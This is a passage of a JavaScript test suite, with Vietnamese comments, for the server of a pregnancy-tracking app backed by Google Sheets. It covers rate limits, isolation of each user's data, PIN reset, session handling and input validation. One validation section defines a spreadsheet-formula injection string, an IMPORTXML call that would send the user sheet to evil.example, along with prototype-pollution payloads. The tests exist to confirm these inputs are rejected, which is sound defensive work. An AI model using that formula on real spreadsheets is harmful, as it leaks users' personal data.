  // Giới hạn mỗi phiên (hằng thật 200/10 phút; thử với 5)
  T('hằng SESSION_CALLS_PER_10MIN = 200 trong mã', /var SESSION_CALLS_PER_10MIN = 200;/.test(SRC));
  const env4 = fresh({ consts: { SESSION_CALLS_PER_10MIN: 5 } });
  const s5 = reg(env4, newPhone());
  const calls = [1, 2, 3, 4, 5, 6].map(() => env4.post({ action: 'whoami', token: s5.token }));
  T('quá 5 lời gọi/10 phút của một phiên → rate_limited có retryAfterSec', calls.slice(0, 5).every(r => r.result === 'success') && calls[5].error === 'rate_limited' && calls[5].retryAfterSec > 0);
  const other = reg(env4, newPhone());
  T('giới hạn theo từng phiên: phiên khác vẫn gọi được', env4.post({ action: 'whoami', token: other.token }).result === 'success');
  env4.advance(10 * 60000);
  T('khung 10 phút sau: gọi lại được', env4.post({ action: 'whoami', token: s5.token }).result === 'success');
}

/* =====================================================================
 * H. S-05 Không trả dữ liệu người khác
 * ===================================================================== */
section('H. S-05 cô lập dữ liệu giữa hai người');
{
  const env = fresh();
  const a = reg(env, newPhone(), { consent: consent(true) }), b = reg(env, newPhone(), { consent: consent(true) });
  const kb = kick(), cb = checkin({ note: 'chữ của B' }), lb = letter({ text: 'thư của B' }), tb = tg();
  save(env, b.token, [kb, cb, lb, tb, habit(), profile({ edd: '2027-02-01' })]);
  const ka = kick();
  save(env, a.token, [ka, habit({ marks: { breath: 'x' } }), profile()]);
  const la = list(env, a.token);
  const txt = JSON.stringify(la);
  T('listMine của A không có bản ghi của B', !txt.includes(kb.id) && !txt.includes(cb.id) && !txt.includes(lb.id) && !txt.includes(tb.id) && !txt.includes('của B') && la.records.kick.length === 1 && la.records.profile.edd === '2027-01-21');
  const ea = JSON.stringify(env.post({ action: 'exportMine', token: a.token }));
  T('exportMine của A không có bản ghi của B', !ea.includes(kb.id) && !ea.includes('của B'));
  const d = env.post({ action: 'deleteRecords', token: a.token, items: [{ kind: 'kick', id: kb.id }, { kind: 'checkin', id: cb.id }, { kind: 'letter', id: lb.id }, { kind: 'thaigiao', id: tb.id }] });
  T('A xóa bằng mã bản ghi của B → deleted 0, dữ liệu B còn nguyên', d.deleted === 0 && list(env, b.token).records.kick.length === 1 && list(env, b.token).records.letter.length === 1);
  const before = JSON.stringify(rows(env, 'DemConDap'));
  const hijack = save(env, a.token, [kick({ id: kb.id, h1: 9, total: 9 }), checkin({ id: cb.id }), letter({ id: lb.id }), tg({ id: tb.id })]);
  T('A ghi đè bằng mã lượt / mã bản ghi của B → record_invalid field id, không ghi', hijack.saved.length === 0 && hijack.rejected.length === 4 && hijack.rejected.every(r => r.error === 'record_invalid' && r.field === 'id') && JSON.stringify(rows(env, 'DemConDap')) === before, hijack);
  const kbB = list(env, b.token).records.kick[0];
  T('lượt của B không đổi sau khi A thử ghi đè', kbB.h1 === 5 && kbB.taps.length === 5);
  // Lỗi nội bộ không lộ chi tiết
  const env2 = fresh();
  const s = reg(env2, newPhone());
  const orig = env2.dataFile.getSheetByName;
  env2.dataFile.getSheetByName = () => { throw new Error('Internal SECRET path row 42 /home/x'); };
  const r = env2.post({ action: 'whoami', token: s.token });
  env2.dataFile.getSheetByName = orig;
  T('lỗi nội bộ → chỉ server_busy {retry:true}, không lộ thông báo lỗi', JSON.stringify(r) === '{"result":"error","error":"server_busy","retry":true}', r);
  T('phản hồi không có số dòng, tổng số người dùng', !/row|count|total|users/i.test(JSON.stringify(save(env, a.token, [habit()]))));
}

/* =====================================================================
 * I. S-06 Đặt lại PIN do nhân viên
 * ===================================================================== */
section('I. S-06 đặt lại PIN qua menu, mã 6 số hạn 24 giờ, thu hồi phiên');
{
  const env = fresh();
  const p = newPhone();
  const s1 = reg(env, p); const s2 = env.post({ action: 'login', phone: p, pin: PIN, privateDevice: true });
  env.post({ action: 'whoami', token: s1.token });   // nạp đệm
  T('resetPinFor_: SĐT sai → phone_invalid', env.resetPin('=1+1').error === 'phone_invalid');
  T('resetPinFor_: số chưa có → not_found', env.resetPin(newPhone()).error === 'not_found');
  const logs0 = env.logs.length;
  const rp = env.resetPin(p);
  T('resetPinFor_: mã 6 số, hạn 24 giờ', /^\d{6}$/.test(rp.code) && rp.exp === DEFAULT_START + 24 * HOUR, rp);
  const u = rows(env, 'NguoiDung')[0];
  T('NguoiDung: băm PIN bị xóa, lưu BĂM mã đặt lại (không lưu mã thô), có hạn, cột trạng thái', u[9] === '' && /^[0-9a-f]{64}$/.test(u[11]) && u[12] === rp.exp && /^Đang chờ chị đặt mã mới – hạn /.test(u[7]));
  T('mã thô không nằm ở ô nào, không log', !env.allCells().some(c => c.v === rp.code || (typeof c.v === 'string' && c.v.length < 40 && c.v.includes(rp.code))) && !env.logs.slice(logs0).some(l => l.includes(rp.code)));
  T('đặt lại thu hồi MỌI phiên cũ (kể cả đang trong đệm)', env.post({ action: 'whoami', token: s1.token }).error === 'session_expired' && env.post({ action: 'whoami', token: s2.token }).error === 'session_expired');
  T('PIN cũ hết dùng ngay', env.post({ action: 'login', phone: p, pin: PIN }).error === 'bad_credentials');
  const wrongCode = rp.code === '111111' ? '222222' : '111111';
  T('mã sai → bad_credentials, đếm vào khóa (còn 3 sau 1 lần sai PIN cũ + 1 lần sai mã)', env.post({ action: 'setPinAfterReset', phone: p, code: wrongCode, pin: PIN2 }).remaining === 3);
  T('mã sai dạng (5 số, chữ) → bad_credentials', env.post({ action: 'setPinAfterReset', phone: p, code: '12345', pin: PIN2 }).error === 'bad_credentials' && env.post({ action: 'setPinAfterReset', phone: p, code: 'abcdef', pin: PIN2 }).error === 'bad_credentials');
  T('mã đúng + PIN mới yếu → pin_weak (không tốn lượt)', env.post({ action: 'setPinAfterReset', phone: p, code: rp.code, pin: '123456' }).error === 'pin_weak');
  T('PIN mới sai dạng → pin_invalid', env.post({ action: 'setPinAfterReset', phone: p, code: rp.code, pin: '12' }).error === 'pin_invalid');
  const ok = env.post({ action: 'setPinAfterReset', phone: p, code: rp.code, pin: PIN2, privateDevice: true });
  T('mã đúng → Session mới, máy riêng 30 ngày', ok.result === 'success' && /^[0-9a-f]{64}$/.test(ok.token) && ok.exp === env.clock.now() + 30 * DAYMS, ok);
  const u2 = rows(env, 'NguoiDung')[0];
  T('sau đặt lại: băm mới, xóa dấu đặt lại, trạng thái "Đã đặt mã mới"', /^[0-9a-f]{64}$/.test(u2[9]) && u2[11] === '' && u2[12] === '' && /^Đã đặt mã mới/.test(u2[7]));
  T('PIN mới đăng nhập được, PIN cũ không', env.post({ action: 'login', phone: p, pin: PIN2 }).result === 'success' && env.post({ action: 'login', phone: p, pin: PIN }).error === 'bad_credentials');
  T('dùng lại mã đã dùng → bad_credentials', env.post({ action: 'setPinAfterReset', phone: p, code: rp.code, pin: '471936' }).error === 'bad_credentials');
  // Hết hạn
  const envX = fresh();
  const px = newPhone(); reg(envX, px);
  const rx = envX.resetPin(px);
  envX.advance(24 * HOUR + 1000);
  T('mã quá 24 giờ → bad_credentials', envX.post({ action: 'setPinAfterReset', phone: px, code: rx.code, pin: PIN2 }).error === 'bad_credentials');
  // 5 lần mã sai → khóa, mã đúng cũng bị khóa
  const envY = fresh();
  const py = newPhone(); reg(envY, py);
  const ry = envY.resetPin(py);
  for (let i = 0; i < 5; i++) envY.post({ action: 'setPinAfterReset', phone: py, code: String(100000 + i), pin: PIN2 });
  T('5 lần mã sai → khóa; mã đúng cũng locked', envY.post({ action: 'setPinAfterReset', phone: py, code: ry.code, pin: PIN2 }).error === 'locked');
  T('đặt lại lần nữa xóa khóa đếm sai cho chị', (() => { const r2 = envY.resetPin(py); return envY.post({ action: 'setPinAfterReset', phone: py, code: r2.code, pin: PIN2 }).result === 'success'; })());
  // Người khác đăng ký trước bằng số của chị (PRD câu 23b)
  const envZ = fresh();
  const pz = newPhone();
  const thief = reg(envZ, pz);
  const rz = envZ.resetPin(pz);
  T('kẻ đăng ký trước: đặt lại làm phiên và PIN của họ vô hiệu', envZ.post({ action: 'whoami', token: thief.token }).error === 'session_expired' && envZ.post({ action: 'login', phone: pz, pin: PIN }).error === 'bad_credentials' &&
    envZ.post({ action: 'setPinAfterReset', phone: pz, code: rz.code, pin: PIN2 }).result === 'success');
  // Menu trên Sheet
  const envM = fresh();
  const pm = newPhone(); reg(envM, pm);
  envM.ui.responses.push({ button: 'OK', text: pm.replace(/(\d{4})(\d{3})(\d{3})/, '$1 $2 $3') });
  envM.ctx.menuResetPin();
  const al = envM.alerts.filter(x => x.kind === 'alert').pop();
  const code = (/Mã đặt lại: (\d{6})/.exec(al ? al.msg : '') || [])[1];
  T('menu "Đặt lại mã PIN…": hộp thoại hiện mã 6 số và SĐT đã che', !!code && al.title.includes('••• ••' + pm.slice(-3)) && !al.title.includes(pm), al);
  T('mã trong hộp thoại dùng được', envM.post({ action: 'setPinAfterReset', phone: pm, code, pin: PIN2 }).result === 'success');
  const nAlerts = envM.alerts.length;
  envM.ui.responses.push({ button: 'CANCEL', text: pm });
  envM.ctx.menuResetPin();
  T('menu: bấm Hủy → không đặt lại', envM.alerts.length === nAlerts + 1 && envM.post({ action: 'login', phone: pm, pin: PIN2 }).result === 'success');
  envM.ui.responses.push({ button: 'OK', text: 'abc' });
  envM.ctx.menuResetPin();
  T('menu: SĐT sai → báo lỗi, không mã', /chưa đúng định dạng/.test(envM.alerts.pop().msg));
  // RESET_REQUIRE_CODE = false (anh chọn chỉ dấu đặt lại)
  const envN = fresh({ consts: { RESET_REQUIRE_CODE: false } });
  const pn = newPhone(); reg(envN, pn);
  T('RESET_REQUIRE_CODE=false: không có dấu đặt lại → vẫn bad_credentials', envN.post({ action: 'setPinAfterReset', phone: pn, code: '000000', pin: PIN2 }).error === 'bad_credentials');
  envN.resetPin(pn);
  T('RESET_REQUIRE_CODE=false: có dấu còn hạn → đặt PIN mới không cần mã', envN.post({ action: 'setPinAfterReset', phone: pn, pin: PIN2 }).result === 'success');
}

/* =====================================================================
 * J. S-07 Máy dùng chung (phần server)
 * ===================================================================== */
section('J. S-07 phiên ngắn / máy riêng, đăng xuất');
{
  const env = fresh();
  const p = newPhone(); reg(env, p);
  const sh = env.post({ action: 'login', phone: p, pin: PIN });
  const pv = env.post({ action: 'login', phone: p, pin: PIN, privateDevice: true });
  T('không tick → "Phiên ngắn" 12 giờ; tick → "Máy riêng" 30 ngày', sh.exp - env.clock.now() === 12 * HOUR && pv.exp - env.clock.now() === 30 * DAYMS &&
    rows(env, 'PhienDangNhap').slice(-2).map(r => r[3]).join() === 'Phiên ngắn,Máy riêng');
  T('logout luôn thành công kể cả token sai / thiếu', ['', 'x', undefined, crypto.randomBytes(32).toString('hex')].every(t => env.post({ action: 'logout', token: t }).result === 'success'));
  env.post({ action: 'logout', token: sh.token });
  T('logout một phiên không đụng phiên khác', env.post({ action: 'whoami', token: pv.token }).result === 'success' && env.post({ action: 'whoami', token: sh.token }).error === 'session_expired');
}

/* =====================================================================
 * K. S-08 Ghi an toàn: công thức, whitelist, khoảng, độ dài, ngày, khớp nhau, lock, giờ server, cột @
 * ===================================================================== */
section('K. S-08 chặn công thức, whitelist, khoảng số, độ dài');
{
  const env = fresh();
  const a = reg(env, newPhone(), { consent: consent(true) });
  const F = '=IMPORTXML("https://evil.example/?d="&JOIN(";";NguoiDung!A2:N500);"//a")';
  const PREFIX = [F, '+1+1', '-1+1', '@SUM(1)', '\t=1', '\r=1'];
  // Chuỗi công thức ở MỌI trường có danh sách / dạng cố định → từ chối
  const fields = [
    ['habit', 'day'], ['habit', 'marks', { water: F }], ['habit', 'marks', { [F]: 'x' }],
    ['prefs', 'enabled', [F]], ['profile', 'edd'],
    ['checkin', 'id'], ['checkin', 'emotions', [F]], ['checkin', 'exercise'], ['checkin', 'fit'], ['checkin', 'contexts', [F]],
    ['thaigiao', 'id'], ['thaigiao', 'day'], ['thaigiao', 'prompt'], ['thaigiao', 'how'],
    ['letter', 'id'], ['letter', 'day'], ['letter', 'prompt'],
    ['kick', 'id'], ['kick', 'meal'], ['kick', 'level'], ['kick', 'reasons', [F]], ['kick', 'feel'], ['kick', 'signs', [F]]
  ];
  const mk = { habit, prefs: o => Object.assign({ kind: 'prefs', enabled: ['water'] }, o), profile, checkin, thaigiao: tg, letter, kick };
  let allRejected = true; const miss = [];
  for (const pfx of PREFIX) for (const [kind, f, val] of fields) {
    const rec = mk[kind]({ [f]: val === undefined ? pfx : (typeof val === 'object' && !Array.isArray(val) ? Object.fromEntries(Object.entries(val).map(([k, v]) => [k === F ? pfx : k, v === F ? pfx : v])) : val.map(x => (x === F ? pfx : x))) });
    const r = save(env, a.token, [rec]);
    if (!(r.rejected.length === 1 && r.rejected[0].error === 'record_invalid')) { allRejected = false; miss.push(kind + '.' + f); }
  }
  T('chuỗi = + - @ tab CR ở mọi trường cố định → record_invalid', allRejected, miss);
  T('SĐT / PIN / phiên bản đồng ý dạng công thức → từ chối', env.post({ action: 'register', phone: F, pin: PIN, consent: consent() }).error === 'phone_invalid' &&
    env.post({ action: 'login', phone: newPhone(), pin: F }).error === 'pin_invalid' &&
    env.post({ action: 'register', phone: newPhone(), pin: PIN, consent: { sheet: true, version: F } }).error === 'consent_required');
  // Chữ tự do: nhận, nhưng ghi có dấu ' (văn bản)
  const freeTexts = PREFIX.map(pfx => letter({ text: pfx + ' thương con' }));
  const rFree = save(env, a.token, freeTexts.concat([checkin({ note: F })]));
  T('chữ tự do bắt đầu = + - @ vẫn lưu (chị viết gì cũng được)', rFree.saved.length === freeTexts.length + 1, rFree);
  const priv = env.sheet('ChuRieng', 'priv');
  const textRows = priv.values().slice(1);
  const forcedAll = textRows.every((row, i) => !/^[=+\-@]/.test(row[6]) || priv.forcedAt(i + 2, 7));
  T('ô chữ bắt đầu = + - @ được ghi kèm dấu \' (Sheets coi là văn bản)', forcedAll && textRows.some(r => r[6].startsWith('=IMPORTXML')));
  T('đọc lại đúng nguyên văn (không thêm dấu \')', list(env, a.token, { kinds: ['letter'] }).records.letter.some(l => l.text === F + ' thương con'));
  T('tab/CR đầu chữ bị bỏ (ký tự điều khiển)', textRows.some(r => r[6] === '=1 thương con'));
  // Số ngoài khoảng, sai kiểu
  const numBad = [
    checkin({ before: 11 }), checkin({ before: -1 }), checkin({ before: 3.5 }), checkin({ before: '5' }), checkin({ after: true }), checkin({ minutes: 121 }),
    checkin({ ageMs: -1 }), checkin({ ageMs: 8 * DAYMS + 1 }), checkin({ ageMs: 1.5 }), checkin({ ageMs: '0' }), checkin({ ageMs: undefined }),
    checkin({ emotions: ['worried', 'worried'] }), checkin({ emotions: 'worried' }), checkin({ emotions: Array(9).fill('sad') }), checkin({ contexts: ['sleep', 'nap'] }),
    checkin({ exercise: 'BOX_4444' }), checkin({ exercise: 'BREATHE_478' }), checkin({ fit: 'great' }), checkin({ note: 5 }), checkin({ note: { t: 1 } }),
    kick({ h1: 201, total: 201 }), kick({ h1: -1 }), kick({ h2: 1.5 }), kick({ total: 6 }), kick({ min4: 121 }), kick({ min10: '3' }), kick({ startAgeMs: -5 }),
    kick({ startAgeMs: 9 * DAYMS }), kick({ hadYellow: 'false' }), kick({ gaDays: 295 }), kick({ gaDays: -1 }), kick({ gaDays: 10.5 }), kick({ gaDays: '100' })
  ];
  const nb = save(env, a.token, numBad.slice(0, 20));
  const nb2 = save(env, a.token, numBad.slice(20));
  T('số ngoài khoảng / sai kiểu / mảng trùng, dài, sai → record_invalid có field', nb.rejected.length === 20 && nb2.rejected.length === numBad.length - 20 && nb.rejected.concat(nb2.rejected).every(r => r.error === 'record_invalid' && r.field), [nb, nb2]);
  // Mã bản ghi
  const ids = ['ABCDEFGHIJKLMNOP', 'abc', 'a'.repeat(41), 'abcdef-ghijklmno', 'abcdefghijkl mno', 123456789012345, null];
  T('mã bản ghi sai ^[0-9a-z]{12,40}$ → record_invalid field id', save(env, a.token, ids.map(id => tg({ id }))).rejected.every(r => r.field === 'id'));
  // Ngày: có thật, trong cửa sổ [ngàyThựcHiện − 2, +1]
  const dres = ['2026-10-26', '2026-10-27', '2026-10-30', '2026-10-31', '2026-02-30', '2026-2-3', '29/10/2026', '2026-10-29T00:00'].map(d => save(env, a.token, [tg({ day: d })]).saved.length);
  T('ngày −3 từ chối, −2 và +1 nhận, +2 từ chối, ngày không có thật / sai dạng từ chối', dres.join() === '0,1,1,0,0,0,0,0', dres);
  T('hàng chờ 7 ngày: ageMs 7 ngày, ngày của lúc làm vẫn nhận', save(env, a.token, [tg({ ageMs: 7 * DAYMS, day: '2026-10-22' })]).saved.length === 1);
  T('thói quen sửa được hôm nay và 2 ngày trước, không 3 ngày trước', save(env, a.token, [habit({ day: '2026-10-27' })]).saved.length === 1 && save(env, a.token, [habit({ day: '2026-10-26' })]).saved.length === 0);
  // Ngày dự sinh (profile.edd) — khoảng [ngàyThựcHiện − 14, + 280]
  const edds = ['2026-10-15', '2026-10-14', '2027-08-05', '2027-08-06', '2026-02-30', '2027-1-21', '', 20270121].map(e => save(env, a.token, [profile({ edd: e })]).saved.length);
  T('edd: −14 và +280 nhận; −15, +281, ngày không có thật, sai dạng từ chối', edds.join() === '1,0,1,0,0,0,0,0', edds);
  T('edd null → xóa, whoami trả null', save(env, a.token, [profile({ edd: null })]).saved.length === 1 && env.post({ action: 'whoami', token: a.token }).edd === null && rows(env, 'HoSo').length === 1 && rows(env, 'HoSo')[0][1] === '');
  T('edd thiếu ageMs → record_invalid field ageMs', save(env, a.token, [{ kind: 'profile', edd: '2027-01-21' }]).rejected[0].field === 'ageMs');
  // Khớp nhau của lượt đếm
  const incons = [
    kick({ level: 'red', reasons: [] }), kick({ level: 'green', reasons: ['h2_low'] }), kick({ h1: 3, total: 3 }),
    kick({ hadYellow: true, h1: 4, h2: 6, total: 10 }), kick({ hadYellow: true, h1: 3, h2: 6, total: 9 }), kick({ level: 'yellow' }), kick({ level: 'pending' }),
    kick({ reasons: ['too_slow'], level: 'red' }), kick({ signs: ['bleeding', 'bleeding'] }), kick({ feel: 'great' }), kick({ meal: 'brunch' })
  ];
  T('lượt đếm không khớp (đỏ ⇔ lý do, xanh ⇒ giờ 1 ≥ 4, xanh sau vàng ⇒ ≤ 3 & tổng ≥ 10), mức chưa chốt → từ chối', save(env, a.token, incons).rejected.length === incons.length);
  const valids = [kick(), kick({ level: 'red', reasons: ['h2_low', 'lt10_2h'], h1: 2, h2: 3, total: 5, hadYellow: true, min4: 70, feel: null }),
    kick({ level: 'green', hadYellow: true, h1: 2, h2: 8, total: 10, min4: 65, min10: 110 }), kick({ level: 'stopped', h1: 2, total: 2, min4: null, feel: null, taps: [] }),
    kick({ level: 'stopped_yellow', hadYellow: true, h1: 1, h2: 1, total: 2, min4: null }), kick({ level: 'red', reasons: ['danger_sign'], signs: ['bleeding', 'no_movement'], h1: 0, total: 0, min4: null, taps: [], meal: null, gaDays: null })];
  T('lượt đếm đúng (xanh, đỏ, xanh sau vàng, dừng, dừng khi vàng, đỏ vì dấu hiệu) → nhận', save(env, a.token, valids).saved.length === valids.length);
  // Vị trí chạm
  const tapBad = [
    { taps: Array.from({ length: 201 }, (_, i) => ({ t: i * 1000, x: 0.5, y: 0.5 })) }, { taps: [{ t: 5000, x: 0.5, y: 0.5 }, { t: 4000, x: 0.5, y: 0.5 }] },
    { taps: [{ t: 7260001, x: 0.1, y: 0.1 }] }, { taps: [{ t: -1, x: 0.1, y: 0.1 }] }, { taps: [{ t: 1.5, x: 0.1, y: 0.1 }] },
    { taps: [{ t: 1000, x: 1.0001, y: 0.5 }] }, { taps: [{ t: 1000, x: -0.01, y: 0.5 }] }, { taps: [{ t: 1000, x: 0.5, y: null }] },
    { taps: [{ t: 1000, x: '0.5', y: '0.5' }] }, { taps: [{ t: 1000, x: 0.5, y: 0.5, h: 2 }] }, { taps: [{ t: 3600000, x: 0.5, y: 0.5, h: 1 }] },
    { taps: [null] }, { taps: [[1000, 0.5, 0.5]] }, { taps: '1,2,3;4,5,6' }, { taps: { length: 1 } }
  ].map(o => kick(o));
  const tb = save(env, a.token, tapBad);
  T('vị trí chạm sai (201 điểm, t giảm, t ngoài 0…7.260.000 ms, x/y ngoài 0–1, một bên null, chuỗi, h lệch, sai kiểu) → từ chối cả lượt', tb.rejected.length === tapBad.length && tb.rejected.every(r => r.field === 'taps'), tb);
  const t200 = kick({ taps: Array.from({ length: 200 }, (_, i) => ({ t: i * 30000, x: (i % 10) / 10, y: i % 3 ? null : 0.5 })).map(p => (p.y === null ? { t: p.t, x: null, y: null } : p)) });
  T('đúng 200 điểm → nhận; DauChan một dòng, "Số điểm" 200', save(env, a.token, [t200]).saved.length === 1 && rows(env, 'DauChan').find(r => r[1] === t200.id)[2] === 200);
  const tk = kick({ taps: [{ t: 125400, x: 0.4126, y: 0.7334, h: 1 }, { t: 300999, x: null, y: null }, { t: 3600000, x: 0, y: 1, h: 2 }] });
  save(env, a.token, [tk]);
  const dc = rows(env, 'DauChan').find(r => r[1] === tk.id);
  T('server tự dựng chuỗi điểm "t(giây),x*1000,y*1000;…" từ số đã kiểm', dc[3] === '125,413,733;300,,;3600,0,1000', dc);
  const back = list(env, a.token, { kinds: ['kick'] }).records.kick.find(k => k.id === tk.id);
  T('listMine dựng lại taps (x, y 3 chữ số; bấm nút → null)', JSON.stringify(back.taps) === JSON.stringify([{ t: 125000, x: 0.413, y: 0.733 }, { t: 300000, x: null, y: null }, { t: 3600000, x: 0, y: 1 }]), back.taps);
  // Độ dài, NFC, ký tự điều khiển
  const long = letter({ text: '👶'.repeat(2100) });
  const nfc = letter({ text: 'Mẹ thương con ăn ngon' });
  const ctrl = letter({ text: '  a\u0000b\tc\r\nd‮e​f  ' });
  const nlong = checkin({ note: 'x'.repeat(1500) });
  save(env, a.token, [long, nfc, ctrl, nlong]);
  const lt = list(env, a.token, { kinds: ['letter', 'checkin'] }).records;
  const g = id => lt.letter.find(l => l.id === id).text;
  T('lời nhắn cắt còn 2.000 ký tự (đếm emoji là 1)', Array.from(g(long.id)).length === 2000);
  T('chữ chuẩn hóa NFC', g(nfc.id) === 'Mẹ thương con ăn ngon'.normalize('NFC') && g(nfc.id) === 'Mẹ thương con ăn ngon'.normalize('NFC'));
  T('bỏ ký tự điều khiển, ký tự ẩn, đảo chiều; giữ xuống dòng; cắt khoảng trắng hai đầu', g(ctrl.id) === 'abc\ndef', JSON.stringify(g(ctrl.id)));
  T('"kể thêm" cắt còn 1.000 ký tự', lt.checkin.find(c => c.id === nlong.id).note.length === 1000);
  T('chữ rỗng sau khi làm sạch → record_invalid field text', save(env, a.token, [letter({ text: ' \u0000 ' })]).rejected[0].field === 'text');
  // Lô
  T('records không phải mảng → bad_records', env.post({ action: 'saveRecords', token: a.token, records: {} }).error === 'bad_records' && env.post({ action: 'saveRecords', token: a.token }).error === 'bad_records');
  T('> 20 bản ghi → too_many_records, không ghi gì', (() => { const n = rows(env, 'ThaiGiao').length; return env.post({ action: 'saveRecords', token: a.token, records: Array.from({ length: 21 }, () => tg()) }).error === 'too_many_records' && rows(env, 'ThaiGiao').length === n; })());
  T('kind lạ / __proto__ / bản ghi không phải object → record_invalid field kind', save(env, a.token, [{ kind: 'admin' }, { kind: '__proto__' }, { kind: 'constructor' }, null, 'x', [1]]).rejected.every(r => r.field === 'kind'));
  T('mã danh sách dạng thuộc tính Object (constructor, toString, hasOwnProperty) → từ chối', save(env, a.token, [checkin({ emotions: ['constructor'] }), checkin({ exercise: 'toString' }), habit({ marks: { hasOwnProperty: 'x' } }), checkin({ fit: '__proto__' })]).rejected.length === 4);
  const rawProto = env.post('{"action":"saveRecords","token":"' + a.token + '","records":[{"kind":"habit","day":"' + DAY + '","ageMs":0,"marks":{"__proto__":"x"}},{"kind":"__proto__"}]}');
  T('khóa "__proto__" trong JSON thô → từ chối, không đụng prototype', rawProto.rejected.length === 2 && rawProto.rejected[0].field === 'marks' && ({}).x === undefined, rawProto);
  T('rejected có key để client bỏ đúng mục', (() => { const c = checkin({ before: 99 }); const r = save(env, a.token, [c, { kind: 'zzz' }]); return r.rejected[0].key === 'checkin:' + c.id && r.rejected[1].key === '#1'; })());
  // Giờ server, không giờ client
  const ci = checkin({ ageMs: 90000, at: 0, createdAt: '01/01/2020' });
  save(env, a.token, [ci]);
  const row = rows(env, 'CheckIn').find(r => r[2] === ci.id);
  T('giờ ghi = giờ server − ageMs; bỏ at / createdAt client gửi', row[11] === env.clock.now() - 90000 && row[3] === '09:58:30 29/10/2026' && row[0] === '10:00:00 29/10/2026', row);
  T('Sheet hiện chữ tiếng Việt, không mã kỹ thuật', row[4] === 'Lo lắng, Mệt' && row[7] === 'Thở chậm 4 vào – 6 ra' && row[8] === 'Phù hợp' && row[9] === 'Khó ngủ');
  // Cột @: ngày vẫn là chuỗi
  T('cột Ngày lưu chuỗi YYYY-MM-DD (không thành ngày kiểu Mỹ)', rows(env, 'ThoiQuen').every(r => typeof r[1] === 'string' && /^\d{4}-\d{2}-\d{2}$/.test(r[1])) && rows(env, 'HoSo').every(r => typeof r[1] === 'string'));
  // Cập nhật cùng mã: một dòng
  const kk = kick();
  save(env, a.token, [kk]);
  const n1 = rows(env, 'DemConDap').length, d1 = rows(env, 'DauChan').length;
  const t1 = rows(env, 'DemConDap').find(r => r[2] === kk.id)[0];
  env.advance(HOUR);
  save(env, a.token, [Object.assign({}, kk, { level: 'red', reasons: ['mother_reported'], feel: 'different', taps: kk.taps.slice(0, 2) })]);
  const kr = rows(env, 'DemConDap').find(r => r[2] === kk.id);
  T('cùng mã lượt gửi lại → vẫn một dòng ở DemConDap và DauChan', rows(env, 'DemConDap').length === n1 && rows(env, 'DauChan').length === d1);
  T('cập nhật giữ "Thời gian ghi" lần đầu, đổi mức', kr[0] === t1 && kr[10] === 'Đã báo đi khám' && rows(env, 'DauChan').find(r => r[1] === kk.id)[2] === 2);
  save(env, a.token, [habit({ marks: { water: 'x' }, ageMs: HOUR })]);
  const h1 = rows(env, 'ThoiQuen').length;
  save(env, a.token, [habit({ marks: { water: '' , breath: 'x' }, ageMs: HOUR })]);
  T('thói quen cùng ngày ghi đè cả ngày (một dòng)', rows(env, 'ThoiQuen').length === h1 && list(env, a.token, { kinds: ['habit'] }).records.habit.find(x => x.day === DAY).marks.water === '');
  const c2 = checkin(); save(env, a.token, [c2]); save(env, a.token, [Object.assign({}, c2, { after: 1 })]);
  T('check-in cùng mã → một dòng', rows(env, 'CheckIn').filter(r => r[2] === c2.id).length === 1);
  // Lock lỗi: không ghi nửa chừng
  const envL = fresh();
  const sL = reg(envL, newPhone());
  const snap = () => JSON.stringify(envL.dump().files);
  let s0 = snap(); envL.lock.plan.push(true);
  T('lock lỗi khi saveRecords → server_busy {retry:true}, không ghi gì', JSON.stringify(save(envL, sL.token, [habit(), kick()])) === '{"result":"error","error":"server_busy","retry":true}' && snap() === s0);
  s0 = snap(); envL.lock.plan.push(true);
  T('lock lỗi khi register → server_busy, không thêm người dùng', envL.post({ action: 'register', phone: newPhone(), pin: PIN, consent: consent() }).error === 'server_busy' && snap() === s0);
  const pL = newPhone(); reg(envL, pL);
  s0 = snap(); envL.lock.plan.push(true);
  T('lock lỗi ở bước giữ chỗ đăng nhập → server_busy, chưa đếm sai', envL.post({ action: 'login', phone: pL, pin: WRONG }).error === 'server_busy' && snap() === s0);
  const nS = rows(envL, 'PhienDangNhap').length;
  envL.lock.plan.push(false, true);
  T('lock lỗi ở bước chốt đăng nhập → server_busy, KHÔNG tạo phiên', envL.post({ action: 'login', phone: pL, pin: PIN }).error === 'server_busy' && rows(envL, 'PhienDangNhap').length === nS);
  s0 = snap(); envL.lock.plan.push(true);
  T('lock lỗi khi deleteAccount → server_busy, dữ liệu còn nguyên', envL.post({ action: 'deleteAccount', token: sL.token, confirm: 'DELETE' }).error === 'server_busy' && snap() === s0);
  s0 = snap(); envL.lock.plan.push(true);
  T('lock lỗi khi deleteRecords / setConsent → server_busy', envL.post({ action: 'deleteRecords', token: sL.token, items: [] }).error === 'server_busy' && (envL.lock.plan.push(true), envL.post({ action: 'setConsent', token: sL.token, text: true }).error === 'server_busy') && snap() === s0);
  // Kiểm xong mới khóa: lỗi kiểm dữ liệu không lấy lock
  const w0 = lockWaits(envL);
  [{ action: 'register', phone: 'x', pin: PIN, consent: consent() }, { action: 'register', phone: newPhone(), pin: '1', consent: consent() },
   { action: 'register', phone: newPhone(), pin: '123456', consent: consent() }, { action: 'register', phone: newPhone(), pin: PIN },
   { action: 'login', phone: 'x', pin: PIN }, { action: 'login', phone: pL, pin: 'x' }, { action: 'setPinAfterReset', phone: pL, code: '1', pin: '111111' },
   { action: 'saveRecords', token: sL.token, records: 'x' }, { action: 'saveRecords', token: sL.token, records: Array(21).fill(tg()) },
   { action: 'deleteRecords', token: sL.token, items: [{ kind: 'x' }] }, { action: 'setConsent', token: sL.token, text: 'yes' },
   { action: 'deleteAccount', token: sL.token }, { action: 'whoami' }, { action: 'listMine', token: sL.token, kinds: 'kick' }].forEach(b => envL.post(b));
  T('mọi lỗi kiểm dữ liệu trả về TRƯỚC khi lấy lock', lockWaits(envL) === w0, lockWaits(envL) - w0);
}

/* =====================================================================
 * L. S-09 Tách SĐT khỏi dữ liệu sức khỏe
 * ===================================================================== */
section('L. S-09 SĐT chỉ ở NguoiDung; chữ riêng ở file khác');
{
  const env = fresh();
  const phones = [newPhone(), newPhone()];
  const ss = phones.map(p => reg(env, p, { consent: consent(true) }));
  ss.forEach(s => save(env, s.token, [habit(), kick(), checkin({ note: 'ghi chú' }), letter(), tg(), profile(), { kind: 'prefs', enabled: ['kick'] }]));
  env.post({ action: 'login', phone: newPhone(), pin: WRONG });
  const forms = phones.flatMap(p => [p, p.slice(1), e164(p), '84' + p.slice(1)]);
  const leaks = env.allCells().filter(c => c.sheet !== 'NguoiDung' && forms.some(f => String(c.v).includes(f)));
